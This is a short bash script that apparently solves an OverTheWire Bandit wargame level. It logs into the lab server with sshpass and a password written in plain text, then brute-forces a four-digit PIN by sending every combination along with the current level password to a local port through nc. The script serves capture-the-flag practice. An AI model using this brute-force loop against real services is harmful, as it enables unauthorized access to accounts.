#!/usr/bin/env bash

sshpass -p UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ssh bandit24@bandit.labs.overthewire.org -p 2220

seq -w -s "
`cat /etc/bandit_pass/bandit24` " -1 9999 | nc localhost 30002 | grep -v "Wrong"
